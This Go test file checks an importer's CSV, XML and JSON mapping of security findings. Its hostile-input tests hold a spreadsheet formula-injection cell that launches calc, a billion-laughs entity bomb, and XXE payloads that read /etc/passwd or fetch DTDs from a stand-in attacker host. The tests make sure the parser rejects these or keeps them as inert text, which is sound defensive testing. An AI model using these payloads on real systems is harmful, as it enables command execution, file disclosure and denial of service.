package mapping

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/openctemio/ctis/importer"
)

// csvDoc is a CSV mapping with one finding rule over the columns title,
// severity and asset; csv is the "csv" member ("" for none).
func csvDoc(csv string) string {
	c := ""
	if csv != "" {
		c = `"csv": ` + csv + `,`
	}
	return `{"apiVersion": "openctem.io/mapping/v1", "source": "csv", ` + c + `
	  "records": [{"kind": "finding", "set": {"title": "/title", "severity": {"path": "/severity", "default": "low"}, "asset_value": "/asset", "description": "/note"}}]}`
}

func applyErr(m *Mapping, in string, opts Options) error {
	if opts.Now == nil {
		opts.Now = fixedNow
	}
	_, _, err := m.Apply(context.Background(), strings.NewReader(in), opts)
	return err
}

func TestCSVDelimiters(t *testing.T) {
	cases := map[string]struct {
		spec, in string
	}{
		"comma":      {"", "title,severity\nA,high\n"},
		"semicolon":  {"", "title;severity\nA;high\n"},
		"tab":        {"", "title\tseverity\nA\thigh\n"},
		"pipe":       {"", "title|severity\nA|high\n"},
		"quoted ;":   {"", "\"ti;tle\",title,severity\nx,A,high\n"},
		"override":   {`{"delimiter": ";"}`, "title;severity,x\nA;high,y\n"},
		"skip rows":  {`{"skip_rows": 2}`, "Report export\ngenerated 2026-10-01\ntitle,severity\nA,high\n"},
		"crlf":       {"", "title,severity\r\nA,high\r\n"},
		"bom":        {"", "\xef\xbb\xbftitle,severity\nA,high\n"},
		"one column": {"", "title\nA\n"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			m := mustLoad(t, csvDoc(c.spec))
			r, st := apply(t, m, c.in, Options{})
			if len(r.Findings) != 1 || r.Findings[0].Title != "A" {
				t.Fatalf("findings %+v, stats %+v", r.Findings, st)
			}
			if name != "one column" && name != "override" && r.Findings[0].Severity != "high" {
				t.Fatalf("severity %q", r.Findings[0].Severity)
			}
		})
	}
	// The override is honored even when another delimiter is more frequent.
	m := mustLoad(t, csvDoc(`{"delimiter": ","}`))
	r, _ := apply(t, m, "title,severity;a;b;c\nA,high;x;y;z\n", Options{})
	if len(r.Findings) != 1 || r.Findings[0].Title != "A" {
		t.Fatalf("override: %+v", r.Findings)
	}
}

func TestCSVRefusals(t *testing.T) {
	cases := map[string]string{
		"delimiter":   `{"delimiter": ":"}`,
		"skip rows":   `{"skip_rows": 101}`,
		"neg skip":    `{"skip_rows": -1}`,
		"unknown key": `{"header": false}`,
	}
	for name, spec := range cases {
		if _, err := Load([]byte(csvDoc(spec))); err == nil {
			t.Errorf("%s: loaded", name)
		}
	}
	if _, err := Load([]byte(doc("json", "", assetRule)[:len(doc("json", "", assetRule))-1] + `, "csv": {}}`)); err == nil || !strings.Contains(err.Error(), "csv is for source csv") {
		t.Errorf("csv on json: %v", err)
	}
}

func TestCSVColumns(t *testing.T) {
	m := mustLoad(t, `{"apiVersion": "openctem.io/mapping/v1", "source": "csv", "records": [{"kind": "finding", "set": {
	  "title": "/title_2", "severity": {"const": "low"}, "description": "/column_2", "rule_id": "/a~1b"}}]}`)
	r, st := apply(t, m, "title,,title,a/b,  \nfirst,second,third,ab,x\n", Options{Observe: true})
	if len(r.Findings) != 1 {
		t.Fatalf("stats %+v", st)
	}
	f := r.Findings[0]
	if f.Title != "third" || f.Description != "second" || f.RuleID != "ab" {
		t.Fatalf("finding %+v", f)
	}
	want := []string{"/title", "/column_2", "/title_2", "/a~1b", "/column_5"}
	if fmt.Sprint(st.Fields) != fmt.Sprint(want) {
		t.Fatalf("fields %v, want %v", st.Fields, want)
	}
	if fmt.Sprint(st.Unmapped) != fmt.Sprint([]string{"/title", "/column_5"}) {
		t.Fatalf("unmapped %v", st.Unmapped)
	}
}

func TestCSVHostile(t *testing.T) {
	m := mustLoad(t, csvDoc(""))

	t.Run("formula cells stay text", func(t *testing.T) {
		formulas := []string{`=cmd|' /C calc'!A0`, `+1+1`, `-2+3`, `@SUM(A1:A9)`, "\t=1", `=HYPERLINK("http://x.invalid")`}
		var b strings.Builder
		b.WriteString("title,severity,note\n")
		for i, f := range formulas {
			fmt.Fprintf(&b, "t%d,high,\"%s\"\n", i, strings.ReplaceAll(f, `"`, `""`))
		}
		r, _ := apply(t, m, b.String(), Options{})
		if len(r.Findings) != len(formulas) {
			t.Fatalf("got %d findings", len(r.Findings))
		}
		for i, f := range r.Findings {
			want := strings.TrimSpace(formulas[i])
			if strings.TrimSpace(f.Description) != want {
				t.Errorf("cell %d: %q, want the text %q unchanged", i, f.Description, want)
			}
		}
	})

	t.Run("malformed row skipped, later rows read", func(t *testing.T) {
		r, st := apply(t, m, "title,severity\nA,high\nB\"x,high\nC,low\n", Options{})
		if len(r.Findings) != 2 || st.Skipped != 1 || len(st.Issues) != 1 || !strings.Contains(st.Issues[0].Message, "malformed row") {
			t.Fatalf("findings %d, stats %+v", len(r.Findings), st)
		}
		if st.Issues[0].Record != 3 {
			t.Fatalf("issue line %d, want 3", st.Issues[0].Record)
		}
	})

	t.Run("cell cap", func(t *testing.T) {
		in := "title,severity,note\nA,high," + strings.Repeat("x", 200) + "\nB,low,ok\n"
		r, st := apply(t, m, in, Options{MaxCellBytes: 100})
		if len(r.Findings) != 1 || r.Findings[0].Title != "B" || st.Skipped != 1 {
			t.Fatalf("findings %+v, stats %+v", r.Findings, st)
		}
	})

	t.Run("row cap", func(t *testing.T) {
		in := "title,severity,note\nA,high," + strings.Repeat("x", 90) + "\nB,low,ok\n"
		r, st := apply(t, m, in, Options{MaxRecordBytes: 64})
		if len(r.Findings) != 1 || st.Skipped != 1 {
			t.Fatalf("findings %+v, stats %+v", r.Findings, st)
		}
	})

	t.Run("unterminated quote to the end", func(t *testing.T) {
		in := "title,severity,note\nA,high,\"" + strings.Repeat("y\n", 5000)
		_, st, err := m.Apply(context.Background(), strings.NewReader(in), Options{Now: fixedNow})
		if err != nil {
			t.Fatal(err)
		}
		if st.Skipped != 1 {
			t.Fatalf("stats %+v", st)
		}
	})

	t.Run("too many columns", func(t *testing.T) {
		in := strings.Repeat("c,", MaxCSVColumns) + "c\n"
		if err := applyErr(m, in, Options{}); err == nil || !strings.Contains(err.Error(), "columns") {
			t.Fatalf("err %v", err)
		}
	})

	t.Run("utf-16", func(t *testing.T) {
		if err := applyErr(m, "\xff\xfet\x00i\x00", Options{}); !errors.Is(err, ErrEncoding) {
			t.Fatalf("err %v", err)
		}
	})

	t.Run("input cap", func(t *testing.T) {
		in := "title,severity\n" + strings.Repeat("A,high\n", 1000)
		if err := applyErr(m, in, Options{MaxInputBytes: 1024}); !errors.Is(err, ErrInputTooLarge) {
			t.Fatalf("err %v", err)
		}
	})

	t.Run("record cap", func(t *testing.T) {
		in := "title,severity\n" + strings.Repeat("A,high\n", 100)
		r, st := apply(t, m, in, Options{MaxRecords: 10})
		if !st.Truncated || len(r.Findings) > 10 {
			t.Fatalf("stats %+v", st)
		}
	})

	t.Run("extra cells and empty cells", func(t *testing.T) {
		m := mustLoad(t, `{"apiVersion": "openctem.io/mapping/v1", "source": "csv", "records": [
		  {"when": {"path": "/asset", "exists": false}, "kind": "finding", "set": {"title": "/title", "severity": {"const": "low"}}}]}`)
		r, st := apply(t, m, "title,asset\nA,   \nB,host,extra\n", Options{})
		if len(r.Findings) != 1 || r.Findings[0].Title != "A" {
			t.Fatalf("findings %+v", r.Findings)
		}
		if len(st.Issues) != 1 || !strings.Contains(st.Issues[0].Message, "beyond the header") {
			t.Fatalf("issues %+v", st.Issues)
		}
	})

	t.Run("no header", func(t *testing.T) {
		_, st := apply(t, m, "", Options{})
		if len(st.Issues) != 1 {
			t.Fatalf("issues %+v", st.Issues)
		}
	})
}

// xmlDoc is an XML mapping over <item> elements.
func xmlDoc(each string) string {
	return `{"apiVersion": "openctem.io/mapping/v1", "source": "xml", "each": "` + each + `",
	  "records": [{"kind": "finding", "set": {"title": "/@name", "severity": {"path": "/sev", "first": true, "default": "low"}, "rule_id": "/rule/#text", "description": "/note"}}]}`
}

func TestXMLHostile(t *testing.T) {
	m := mustLoad(t, xmlDoc("//item"))
	refused := map[string]string{
		"billion laughs": `<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<r><item name="&lol3;"/></r>`,
		"xxe file":        `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><item name="&x;"/></r>`,
		"xxe parameter":   `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.invalid/x.dtd"> %p;]><r/>`,
		"external dtd":    `<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://attacker.invalid/r.dtd"><r><item name="a"/></r>`,
		"public dtd":      `<!DOCTYPE r PUBLIC "-//X//DTD X//EN" "http://attacker.invalid/r.dtd"><r/>`,
		"undefined ent":   `<r><item name="&x;"/></r>`,
		"utf-16 declared": `<?xml version="1.0" encoding="UTF-16"?><r/>`,
		"unclosed":        `<r><item name="a">`,
		"depth bomb":      strings.Repeat("<a>", 100) + strings.Repeat("</a>", 100),
		"two roots":       `<r/><r/>`,
	}
	for name, in := range refused {
		t.Run(name, func(t *testing.T) {
			if err := applyErr(m, in, Options{}); err == nil {
				t.Fatal("accepted")
			}
		})
	}
	t.Run("unsafe class", func(t *testing.T) {
		err := applyErr(m, refused["billion laughs"], Options{})
		if !errors.Is(err, importer.ErrUnsafe) {
			t.Fatalf("err %v, want ErrUnsafe", err)
		}
	})
	t.Run("element cap", func(t *testing.T) {
		in := "<r>" + strings.Repeat(`<item name="a"/>`, 200) + "</r>"
		if err := applyErr(m, in, Options{MaxXMLElements: 100}); !errors.Is(err, importer.ErrTooLarge) {
			t.Fatalf("err %v", err)
		}
	})
	t.Run("input cap", func(t *testing.T) {
		in := "<r>" + strings.Repeat(`<item name="a"/>`, 200) + "</r>"
		if err := applyErr(m, in, Options{MaxInputBytes: 500}); !errors.Is(err, ErrInputTooLarge) {
			t.Fatalf("err %v", err)
		}
	})
	t.Run("record budget", func(t *testing.T) {
		in := `<r><item name="big">` + strings.Repeat("<x>abcdefgh</x>", 50) + `</item><item name="ok"/></r>`
		r, st := apply(t, m, in, Options{MaxRecordBytes: 256})
		if len(r.Findings) != 1 || r.Findings[0].Title != "ok" || st.Skipped != 1 {
			t.Fatalf("findings %+v, stats %+v", r.Findings, st)
		}
	})
	t.Run("text node over the cap refuses the document", func(t *testing.T) {
		in := `<r><item name="a"><note>` + strings.Repeat("x", 2048) + `</note></item></r>`
		if err := applyErr(m, in, Options{MaxRecordBytes: 1024}); !errors.Is(err, importer.ErrTooLarge) {
			t.Fatalf("err %v", err)
		}
	})
}

func TestXMLRecords(t *testing.T) {
	t.Run("absolute each, lenient paths", func(t *testing.T) {
		m := mustLoad(t, xmlDoc("/report/items/item"))
		in := `<?xml version="1.0" encoding="ISO-8859-1"?>
<!-- comment --><?pi x?>
<report><items>
  <item name="one"><sev>high</sev><rule>R1</rule></item>
  <item name="two"><sev>medium</sev><sev>low</sev><rule kind="x">R2</rule></item>
  <item name="caf` + "\xe9" + `"/>
</items><other><item name="not under items"/></other></report>`
		r, st := apply(t, m, in, Options{})
		if len(r.Findings) != 3 {
			t.Fatalf("stats %+v", st)
		}
		got := []string{}
		for _, f := range r.Findings {
			got = append(got, f.Title+"|"+string(f.Severity)+"|"+f.RuleID)
		}
		want := []string{"one|high|R1", "two|medium|R2", "café|low|"}
		if fmt.Sprint(got) != fmt.Sprint(want) {
			t.Fatalf("got %v, want %v", got, want)
		}
	})
	t.Run("namespaces use local names", func(t *testing.T) {
		m := mustLoad(t, xmlDoc("//item"))
		r, _ := apply(t, m, `<x:r xmlns:x="urn:x"><x:item name="a"><x:sev>high</x:sev></x:item></x:r>`, Options{})
		if len(r.Findings) != 1 || r.Findings[0].Severity != "high" {
			t.Fatalf("findings %+v", r.Findings)
		}
	})
	t.Run("nested match is part of the outer record", func(t *testing.T) {
		m := mustLoad(t, xmlDoc("//item"))
		r, st := apply(t, m, `<r><item name="outer"><item name="inner"/></item></r>`, Options{})
		if len(r.Findings) != 1 || st.Records != 1 || r.Findings[0].Title != "outer" {
			t.Fatalf("findings %+v", r.Findings)
		}
	})
	t.Run("no match", func(t *testing.T) {
		m := mustLoad(t, xmlDoc("//item"))
		_, st := apply(t, m, `<r><x/></r>`, Options{})
		if len(st.Issues) != 1 || !strings.Contains(st.Issues[0].Message, "matched no element") {
			t.Fatalf("issues %+v", st.Issues)
		}
	})
	t.Run("index and list forms", func(t *testing.T) {
		m := mustLoad(t, `{"apiVersion": "openctem.io/mapping/v1", "source": "xml", "each": "//item", "records": [{"kind": "finding", "set": {
		  "title": "/@name", "severity": {"const": "low"}, "rule_id": "/ref[0]", "tags": "/tag", "description": {"path": "/tag", "join": ","}}}]}`)
		r, _ := apply(t, m, `<r><item name="a"><ref>only</ref><tag>x</tag><tag>y</tag></item><item name="b"><ref>r1</ref><ref>r2</ref><tag>z</tag></item></r>`, Options{})
		if len(r.Findings) != 2 {
			t.Fatalf("findings %+v", r.Findings)
		}
		a, b := r.Findings[0], r.Findings[1]
		if a.RuleID != "only" || fmt.Sprint(a.Tags) != "[x y]" || a.Description != "x,y" {
			t.Fatalf("a %+v", a)
		}
		if b.RuleID != "r1" || b.Description != "z" {
			t.Fatalf("b %+v", b)
		}
	})
}

// JSON paths stay strict: the XML leniency does not leak into JSON records.
func TestJSONPathsStayStrict(t *testing.T) {
	m := mustLoad(t, `{"apiVersion": "openctem.io/mapping/v1", "source": "jsonl", "records": [{"kind": "finding", "set": {
	  "title": {"path": "/name/#text", "default": "none"}, "severity": {"const": "low"}, "rule_id": {"path": "/obj/0", "default": "none"}, "description": {"path": "/list/x", "default": "none"}}}]}`)
	r, _ := apply(t, m, `{"name": "a", "obj": {"k": "v"}, "list": [{"x": "1"}]}`, Options{})
	f := r.Findings[0]
	if f.Title != "none" || f.RuleID != "none" || f.Description != "none" {
		t.Fatalf("finding %+v", f)
	}
}

func TestIdentity(t *testing.T) {
	base := func(identity, set string) string {
		return `{"apiVersion": "openctem.io/mapping/v1", "source": "jsonl", "identity": ` + identity + `,
		  "records": [{"kind": "finding", "set": {"title": "/t", "severity": {"const": "low"}` + set + `}}]}`
	}
	refused := map[string][2]string{
		"constant identity":   {`["rule_id"]`, `, "rule_id": {"const": "X"}`},
		"identity not set":    {`["rule_id"]`, ``},
		"identity not target": {`["nope"]`, ``},
		"identity reserved":   {`["asset_ref"]`, ``},
		"twice":               {`["title", "title"]`, ``},
		"too many":            {`["title","rule_id","rule_name","message","category","impact","likelihood","description","evidence"]`, ``},
		"const fingerprint":   {`[]`, `, "fingerprint": {"const": "abc"}`},
	}
	for name, c := range refused {
		if _, err := Load([]byte(base(c[0], c[1]))); err == nil {
			t.Errorf("%s: loaded", name)
		}
	}
	// Mixed constant and source members are an identity.
	m := mustLoad(t, base(`["rule_id", "title"]`, `, "rule_id": {"const": "X"}`[:0]+`, "rule_id": {"path": "/r"}`))
	if fmt.Sprint(m.Identity()) != "[rule_id title]" {
		t.Fatalf("identity %v", m.Identity())
	}
	// An identity on an asset-only mapping is refused.
	if _, err := Load([]byte(`{"apiVersion": "openctem.io/mapping/v1", "source": "jsonl", "identity": ["title"], "records": [` + assetRule + `]}`)); err == nil {
		t.Error("identity without a finding rule loaded")
	}
	// A finding whose identity members are all empty is skipped.
	m = mustLoad(t, `{"apiVersion": "openctem.io/mapping/v1", "source": "jsonl", "identity": ["rule_id", "location.path"],
	  "records": [{"kind": "finding", "set": {"title": {"const": "T"}, "severity": {"const": "low"}, "rule_id": "/r", "location.path": "/p"}}]}`)
	r, st := apply(t, m, "{\"r\": \"a\"}\n{\"r\": \"\"}\n{\"p\": \"x\"}\n", Options{})
	if len(r.Findings) != 2 || st.Skipped != 1 || !strings.Contains(st.Issues[0].Message, "identity") {
		t.Fatalf("findings %d, stats %+v", len(r.Findings), st)
	}
}

func TestRulesSummary(t *testing.T) {
	m := mustLoad(t, `{"apiVersion": "openctem.io/mapping/v1", "source": "jsonl", "records": [{"kind": "finding", "set": {"title": "/t", "severity": {"const": "low"}}}]}`)
	rs := m.Rules()
	if len(rs) != 1 || rs[0].Kind != "finding" || fmt.Sprint(rs[0].Targets) != "[severity title]" {
		t.Fatalf("rules %+v", rs)
	}
	if !rs[0].Const["severity"] || rs[0].Const["title"] || rs[0].Specs["title"] != `"/t"` {
		t.Fatalf("rules %+v", rs)
	}
}

func TestUnmappedCoverage(t *testing.T) {
	got := unmapped([]string{"/a", "/a/b", "/ab", "/c/d"}, []string{"/a", "/c"})
	if fmt.Sprint(got) != "[/ab]" {
		t.Fatalf("unmapped %v", got)
	}
	if got := unmapped([]string{"/x"}, []string{"/"}); len(got) != 0 {
		t.Fatalf("root covers all: %v", got)
	}
}
